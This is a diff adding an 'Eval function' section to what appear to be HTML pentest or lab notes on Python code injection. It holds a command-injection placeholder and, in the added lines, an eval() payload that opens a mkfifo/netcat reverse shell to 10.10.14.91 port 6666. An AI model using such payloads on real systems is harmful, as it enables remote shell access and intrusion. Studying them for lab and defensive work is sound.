@@ -156,6 +156,16 @@ print(r.text)</code></pre>
             <p>Using that we you perform a command exection using any reverse shell comand</p>
             <pre><code class="language-python">; COMMAND ;#</code></pre>
         </ul>
+
+        <h2>Eval function</h2>
+        <ul>
+            <p>In case you found <b>eval()</b> function in any python code you are analyzing this could be a entrance vector since any python code you place inside the function will be executed. An example code would be</p>
+            <pre><code class="language-python">__import__("os").system("ping -c 10.10.14.21")</code></pre>
+            <p>Remember that you need to use the "__import__" since that one is an evaluable expression instead of "import os"</p>
+            <p>Another example payload would be</p>
+            <pre><code class="language-python">__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.91 6666 >/tmp/f")</code></pre>
+        </ul>
+
         </ul>
 
         </div>
